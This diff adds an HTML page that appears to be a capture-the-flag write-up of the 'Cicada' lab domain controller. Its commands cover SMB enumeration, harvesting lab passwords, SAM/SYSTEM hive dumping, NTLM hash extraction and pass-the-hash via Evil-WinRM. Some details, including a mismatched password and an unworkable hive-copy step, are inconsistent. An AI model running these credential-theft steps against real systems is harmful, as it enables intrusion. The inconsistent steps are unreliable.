@@ -1,0 +1,277 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CICADA: Penetration Test Report</title>
+    <!-- Load Tailwind CSS from CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- Configure Tailwind to use a dark theme and custom colors -->
+    <script>
+        tailwind.config = {
+            darkMode: 'class',
+            theme: {
+                extend: {
+                    colors: {
+                        'primary-dark': '#1e293b', // Slate 800
+                        'secondary-dark': '#0f172a', // Slate 900
+                        'accent-neon': '#34d399', // Emerald 400 (a bright neon green)
+                        'text-light': '#e2e8f0', // Slate 200
+                        'text-muted': '#94a3b8', // Slate 400
+                    },
+                    fontFamily: {
+                        sans: ['Inter', 'sans-serif'],
+                        mono: ['"Fira Code"', 'monospace'], // Good for code/hacking feel
+                    },
+                }
+            }
+        }
+    </script>
+    <style>
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #0f172a; 
+        }
+        /* Custom styles for code blocks */
+        .code-block {
+            background-color: #1e293b; /* primary-dark */
+            border-left: 4px solid #34d399; /* accent-neon */
+            white-space: pre-wrap;
+            word-wrap: break-word;
+        }
+        .code-inline {
+            background-color: #1e293b;
+            padding: 2px 4px;
+            border-radius: 4px;
+            font-weight: 600;
+        }
+        /* Style for tables */
+        .tech-table th, .tech-table td {
+            border: 1px solid #334155; /* Slate 700 */
+            padding: 10px;
+            text-align: left;
+        }
+        .tech-table th {
+            background-color: #1e293b;
+            color: #34d399;
+            font-weight: 700;
+        }
+        .tech-table {
+            width: 100%;
+            border-collapse: collapse;
+            font-family: 'Fira Code', monospace;
+            font-size: 0.9rem;
+        }
+
+    </style>
+</head>
+<body class="dark text-text-light min-h-screen">
+    <div id="app" class="max-w-7xl mx-auto">
+        
+        <!-- Header/Navigation (Consistent with index.html) -->
+        <header class="bg-primary-dark p-4 shadow-lg sticky top-0 z-10">
+            <div class="flex justify-between items-center">
+                <h1 class="text-2xl font-mono font-bold text-accent-neon tracking-wider">
+                    <span class="text-text-light">&lt;</span>CTF<span class="text-text-light">/&gt;</span> Logs
+                </h1>
+                <nav>
+                    <ul class="flex space-x-6 text-sm md:text-base font-semibold">
+                        <li><a href="index.html" class="hover:text-accent-neon transition duration-200">&larr; Back to Write-ups</a></li>
+                        <li><a href="#" class="hover:text-accent-neon transition duration-200">About Me</a></li>
+                        <li><a href="#" class="hover:text-accent-neon transition duration-200">Contact</a></li>
+                    </ul>
+                </nav>
+            </div>
+        </header>
+
+        <main class="p-4 md:p-8 max-w-4xl mx-auto">
+
+            <!-- Title Section -->
+            <header class="pb-6 mb-8 border-b border-accent-neon/50">
+                <p class="text-sm font-mono uppercase tracking-widest text-indigo-400 mb-2">Active Directory / Pwnable</p>
+                <h1 class="text-4xl md:text-5xl font-extrabold text-text-light mb-2">
+                    CICADA: Penetration Test Report
+                </h1>
+                <p class="text-text-muted text-md">
+                    Published: October 2, 2025 | Target IP: 10.129.210.2
+                </p>
+            </header>
+
+            <!-- Report Content -->
+            <article class="prose max-w-none text-text-light">
+                
+                <h2 class="text-3xl font-bold text-accent-neon mt-8 mb-4">I. Summary</h2>
+                <p class="text-text-muted">
+                    The objective was to gain unauthorized access and administrative control over the target machine, identified as a Windows Domain Controller for the <span class="code-inline font-mono">cicada.htb</span> domain. The exploitation leveraged **information disclosure** via Server Message Block (SMB) guest access, **credential harvesting** through multiple stages of authenticated enumeration, and finally, **privilege escalation** using the misconfigured <span class="code-inline font-mono">SeBackupPrivilege</span> to dump credentials from the SAM and SYSTEM hives, leading to Domain Administrator access. The machine was successfully compromised, and both the user and root flags were retrieved.
+                </p>
+
+                <h2 class="text-3xl font-bold text-accent-neon mt-8 mb-4">II. Initial Enumeration</h2>
+                <h3 class="text-2xl font-semibold text-text-light mt-6 mb-3">Nmap Scan Results</h3>
+                <p class="text-text-muted">
+                    The initial Nmap scan revealed a host of open ports typical of an Active Directory Domain Controller (<span class="code-inline font-mono">10.129.210.2</span>):
+                </p>
+                
+                <table class="tech-table mt-4 mb-6">
+                    <thead>
+                        <tr>
+                            <th>Port</th>
+                            <th>Service</th>
+                            <th>Notes</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr><td>53</td><td>DNS</td><td>Domain Name System</td></tr>
+                        <tr><td>88</td><td>Kerberos</td><td>Authentication Service</td></tr>
+                        <tr><td>135, 139, 445</td><td>RPC/NetBIOS/SMB</td><td>Standard Windows Communication</td></tr>
+                        <tr><td>389, 636</td><td>LDAP</td><td>Active Directory Lightweight Directory Access Protocol</td></tr>
+                        <tr><td>3268, 3269</td><td>LDAP Global Catalog</td><td>AD Global Catalog services</td></tr>
+                        <tr><td>5985</td><td>HTTP</td><td>Windows Remote Management (WinRM/HTTPAPI 2.0)</td></tr>
+                    </tbody>
+                </table>
+                <p class="text-text-muted">
+                    The scan results confirmed the machine is a Windows Domain Controller for the <span class="code-inline font-mono">cicada.htb</span> domain.
+                </p>
+
+                <h3 class="text-2xl font-semibold text-text-light mt-6 mb-3">SMB Share Enumeration</h3>
+                <p class="text-text-muted">
+                    Exploiting the common weak configuration of anonymous/guest access, the SMB protocol was targeted using <span class="code-inline font-mono">nxc (NetExec)</span>:
+                </p>
+                <pre class="code-block p-4 rounded font-mono text-sm overflow-x-auto"><code class="language-bash text-accent-neon">nxc smb 10.129.210.2 -u 'guest' -p '' --shares</code></pre>
+                <p class="text-text-muted">
+                    This revealed several shares, including <span class="code-inline font-mono">HR</span> with **READ** permissions for the guest user. A file, <span class="code-inline font-mono">Notice from HR.txt</span>, was retrieved:
+                </p>
+                <pre class="code-block p-4 rounded font-mono text-sm overflow-x-auto"><code class="language-bash text-accent-neon">smbclient //10.129.210.2/HR -U guest -c 'get "Notice from HR.txt"'</code></pre>
+                <p class="text-text-muted">
+                    The file contained a password intended for new hires:
+                </p>
+                <pre class="code-block p-4 rounded font-mono text-sm text-yellow-400">Password: <strong class="text-text-light">Cicada$M6Corpb*@Lp#nZp!8</strong></pre>
+
+                <h2 class="text-3xl font-bold text-accent-neon mt-8 mb-4">III. Gaining User Access</h2>
+                <h3 class="text-2xl font-semibold text-text-light mt-6 mb-3">User Enumeration with RID Brute-Force</h3>
+                <p class="text-text-muted">
+                    Using <span class="code-inline font-mono">nxc</span>'s <span class="code-inline font-mono">--rid-brute</span> functionality, several domain users were enumerated:
+                </p>
+                <pre class="code-block p-4 rounded font-mono text-sm overflow-x-auto"><code class="language-bash text-accent-neon">nxc smb 10.129.210.2 -u 'guest' -p '' --rid-brute</code></pre>
+                <p class="text-text-muted">
+                    The recovered password was tested against the discovered user list, successfully validating credentials for <span class="code-inline font-mono">michael.wrightson</span>:
+                </p>
+                <pre class="code-block p-4 rounded font-mono text-sm text-yellow-400">
+User: <strong class="text-text-light">michael.wrightson</strong>
+Password: <strong class="text-text-light">Cicada$M6Corpb*@Lp#nZp!8</strong>
+</pre>
+                
+                <h2 class="text-3xl font-bold text-accent-neon mt-8 mb-4">IV. Second-Stage Credential Harvesting</h2>
+                <h3 class="text-2xl font-semibold text-text-light mt-6 mb-3">User Information Disclosure</h3>
+                <p class="text-text-muted">
+                    Authenticated enumeration with the new credentials revealed a critical, hardcoded password in the description field for user <span class="code-inline font-mono">david.orelious</span>:
+                </p>
+                <pre class="code-block p-4 rounded font-mono text-sm overflow-x-auto"><code class="language-bash text-accent-neon">nxc smb 10.129.210.2 -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' --users</code>
+...
+SMB 10.129.210.2 445 CICADA-DC david.orelious ... Just in case I forget my password is <strong class="text-red-400">aRt$Lp#7t*VQ!3</strong>
+</pre>
+                <p class="text-text-muted">
+                    The second set of credentials:
+                </p>
+                <pre class="code-block p-4 rounded font-mono text-sm text-yellow-400">
+User: <strong class="text-text-light">david.orelious</strong>
+Password: <strong class="text-text-light">aRt$Lp#7t*VQ!3</strong>
+</pre>
+
+                <h3 class="text-2xl font-semibold text-text-light mt-6 mb-3">Code Review for Third Credential Set</h3>
+                <p class="text-text-muted">
+                    <span class="code-inline font-mono">david.orelious</span> had <span class="code-inline font-mono">READ</span> access to the <span class="code-inline font-mono">DEV</span> share, which contained <span class="code-inline font-mono">Backup_script.ps1</span>. This PowerShell script exposed a third set of hardcoded credentials:
+                </p>
+                <pre class="code-block p-4 rounded font-mono text-sm overflow-x-auto"><code class="language-powershell text-red-400">
+$username = "emily.oscars"
+$password = ConvertTo-SecureString "Q!3@Lp#M6b7tVt" -AsPlainText -Force
+$credentials = New-Object System.Management.Automation.PSCredential($username, $password)
+</code></pre>
+                <p class="text-text-muted">
+                    The third and final low-privileged credentials:
+                </p>
+                <pre class="code-block p-4 rounded font-mono text-sm text-yellow-400">
+User: <strong class="text-text-light">emily.oscars</strong>
+Password: <strong class="text-text-light">Q!3@Lp#M6b*7t*Vt</strong>
+</pre>
+
+                <h3 class="text-2xl font-semibold text-text-light mt-6 mb-3">Retrieving the User Flag</h3>
+                <p class="text-text-muted">
+                    <span class="code-inline font-mono">emily.oscars</span> had **READ, WRITE** access to the <span class="code-inline font-mono">C$</span> share, allowing navigation to the user's desktop to retrieve the <span class="code-inline font-mono">user.txt</span> flag.
+                </p>
+                <pre class="code-block p-4 rounded font-mono text-sm overflow-x-auto"><code class="language-bash text-accent-neon">smbclient //10.129.210.2/C$ -U emily.oscars
+smb: \> cd Users\emily.oscars.CICADA\Desktop\
+smb: \> get user.txt</code></pre>
+
+                <h2 class="text-3xl font-bold text-accent-neon mt-8 mb-4">V. Privilege Escalation to Domain Administrator</h2>
+                <h3 class="text-2xl font-semibold text-text-light mt-6 mb-3">Initial Access with WinRM and Privilege Check</h3>
+                <p class="text-text-muted">
+                    A remote shell was established using <span class="code-inline font-mono">Evil-WinRM</span>. A check of the user's privileges immediately revealed the critical misconfiguration: the <span class="code-inline font-mono">SeBackupPrivilege</span> was **Enabled**.
+                </p>
+                <pre class="code-block p-4 rounded font-mono text-sm overflow-x-auto"><code class="language-bash text-accent-neon">evil-winrm -i 10.129.210.2 -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'
+
+Evil-WinRM* PS C:\Users\Administrator\Desktop> whoami /priv
+...
+Privilege Name              Description                                State
+============================= ============================== =======
+<strong class="text-red-400">SeBackupPrivilege             Back up files and directories              Enabled</strong>
+...</code></pre>
+
+                <h3 class="text-2xl font-semibold text-text-light mt-6 mb-3">Exploiting SeBackupPrivilege (SAM & SYSTEM Dumping)</h3>
+                <p class="text-text-muted">
+                    This privilege allows reading any file on the system using backup semantics, which was used to copy the <span class="code-inline font-mono">SAM</span> and <span class="code-inline font-mono">SYSTEM</span> registry hives (containing password hashes) to a temporary, accessible directory.
+                </p>
+                <pre class="code-block p-4 rounded font-mono text-sm overflow-x-auto"><code class="language-powershell text-accent-neon"># Copy SAM file
+copy C:\Windows\System32\config\SAM C:\Temp\sam
+
+# Copy SYSTEM file
+copy C:\Windows\System32\config\SYSTEM C:\Temp\system</code></pre>
+                <p class="text-text-muted">
+                    After downloading the hives to the attacking machine, <span class="code-inline font-mono">pypykatz</span> was used to parse the files and extract the Domain Administrator's NTLM hash.
+                </p>
+                <pre class="code-block p-4 rounded font-mono text-sm overflow-x-auto"><code class="language-bash text-accent-neon">pypykatz registry --sam sam system
+...
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:<strong class="text-red-400">2b87e7c93a3e8a0ea4a581937016f341</strong>:::</code></pre>
+                <p class="text-text-muted">
+                    Administrator NTLM Hash: <strong class="text-red-400 font-mono">2b87e7c93a3e8a0ea4a581937016f341</strong>
+                </p>
+                
+                <h3 class="text-2xl font-semibold text-text-light mt-6 mb-3">Final Access (Pass-the-Hash) and Root Flag</h3>
+                <p class="text-text-muted">
+                    The Administrator's NTLM hash was used in a Pass-the-Hash (<span class="code-inline font-mono">PtH</span>) attack to authenticate as the Domain Administrator via WinRM, granting full access to retrieve the root flag from the desktop.
+                </p>
+                <pre class="code-block p-4 rounded font-mono text-sm overflow-x-auto"><code class="language-bash text-accent-neon">evil-winrm -i 10.129.210.2 -u Administrator -H '2b87e7c93a3e8a0ea4a581937016f341'
+
+Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
+<strong class="text-accent-neon">The final flag was retrieved, marking the completion of the compromise.</strong></code></pre>
+
+                <h2 class="text-3xl font-bold text-accent-neon mt-8 mb-4">VI. Tools Used</h2>
+                <ul class="list-disc ml-6 space-y-2 text-text-muted">
+                    <li><strong class="text-text-light">Nmap:</strong> Initial port scanning and service enumeration.</li>
+                    <li><strong class="text-text-light">NetExec (nxc):</strong> SMB share enumeration, RID brute-force, and credential testing.</li>
+                    <li><strong class="text-text-light">smbclient:</strong> Interaction with SMB shares to download files.</li>
+                    <li><strong class="text-text-light">Evil-WinRM:</strong> Establishing a remote PowerShell session and downloading files.</li>
+                    <li><strong class="text-text-light">pypykatz:</strong> Extracting credential hashes from the SAM and SYSTEM hives.</li>
+                </ul>
+
+            </article>
+
+        </main>
+
+        <!-- Footer (Consistent with index.html) -->
+        <footer class="bg-secondary-dark p-6 mt-12 border-t border-accent-neon/30 text-center">
+            <p class="text-sm text-text-muted font-mono">
+                &copy; <span id="current-year-footer"></span> Your Name. All flags captured.
+            </p>
+            <div class="flex justify-center space-x-4 mt-2">
+                <a href="#" class="text-text-muted hover:text-accent-neon transition duration-200">GitHub</a>
+                <a href="#" class="text-text-muted hover:text-accent-neon transition duration-200">LinkedIn</a>
+            </div>
+        </footer>
+
+    </div>
+
+    <script>
+        document.getElementById('current-year-footer').textContent = new Date().getFullYear();
+    </script>
+</body>
+</html>
